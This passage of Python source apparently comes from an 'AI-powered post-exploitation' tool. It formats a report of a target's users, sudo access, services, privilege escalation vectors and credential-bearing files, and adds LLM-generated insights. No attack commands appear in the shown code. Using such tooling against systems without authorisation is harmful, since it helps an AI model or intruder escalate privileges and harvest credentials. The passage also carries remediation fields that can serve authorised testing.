        if self.system_info.sudo_users:
            recommendations.append(f"[SUDO] {len(self.system_info.sudo_users)} users have sudo access - review necessity")
        
        if self.system_info.ssh_keys:
            recommendations.append(f"[SSH] SSH keys found - check for unauthorized access")
        
        return recommendations
    
    def generate_report(self) -> str:
        """Generate human-readable report"""
        if not self.system_info:
            self.run_full_analysis()
        
        report = f"""
================================================================================
         AI-POWERED POST-EXPLOITATION ANALYSIS REPORT
================================================================================
Scan ID: {self.scan_id}
Target: {self.system_info.hostname}
OS: {self.system_info.os_name} {self.system_info.os_version}
Kernel: {self.system_info.kernel}
Analysis Time: {datetime.now().isoformat()}

--------------------------------------------------------------------------------
                            SYSTEM SUMMARY
--------------------------------------------------------------------------------
Hostname: {self.system_info.hostname}
OS: {self.system_info.os_name} {self.system_info.os_version}
Architecture: {self.system_info.architecture}
Uptime: {self.system_info.uptime}

Users ({len(self.system_info.users)}): {', '.join(self.system_info.users[:10])}{'...' if len(self.system_info.users) > 10 else ''}
Sudo Users: {', '.join(self.system_info.sudo_users) if self.system_info.sudo_users else 'None found'}
Groups: {', '.join(self.system_info.groups[:10])}{'...' if len(self.system_info.groups) > 10 else ''}

IP Addresses: {', '.join(self.system_info.ip_addresses)}
Services: {', '.join(self.system_info.services[:10])}{'...' if len(self.system_info.services) > 10 else ''}
Running Processes: {len(self.system_info.running_processes)} found

--------------------------------------------------------------------------------
                      PRIVILEGE ESCALATION ANALYSIS
--------------------------------------------------------------------------------
Risk Score: {self._calculate_risk_score()}/100
Vectors Found: {len(self.priv_esc_vectors)}

"""
        
        for vec in self.priv_esc_vectors:
            report += f"""
[{vec.severity.upper()}] {vec.vector_type.upper()}
Description: {vec.description}
Confidence: {vec.confidence * 100:.0f}%

Findings:
"""
            for finding in vec.findings:
                report += f"  - {finding}\n"
            
            report += "\nCommands to verify:\n"
            for cmd in vec.commands[:5]:
                report += f"  $ {cmd}\n"
            
            report += f"\nRemediation: {vec.remediation}\n"
            report += "-" * 80 + "\n"
        
        report += f"""
--------------------------------------------------------------------------------
                     SENSITIVE FILES RECOMMENDATIONS
--------------------------------------------------------------------------------
Files to Examine: {len(self.sensitive_files)}

"""
        
        for sf in self.sensitive_files[:20]:
            report += f"[P{sf.priority}] [{sf.file_type.upper()}] {sf.file_path}\n"
            report += f"  Reason: {sf.reason}\n"
            report += f"  Contains credentials: {'Yes' if sf.contains_credentials else 'No'}\n"
            report += f"  Commands: {', '.join(sf.commands[:2])}\n\n"
        
        report += f"""
--------------------------------------------------------------------------------
                         AI-GENERATED INSIGHTS
--------------------------------------------------------------------------------
{self.query_llm_for_insights()}

--------------------------------------------------------------------------------
                         ACTIONABLE RECOMMENDATIONS
--------------------------------------------------------------------------------
"""
        
        for rec in self._generate_recommendations()[:20]:
            report += f"{rec}\n"
        
        report += """
================================================================================
                         END OF REPORT
================================================================================
"""
        
        return report
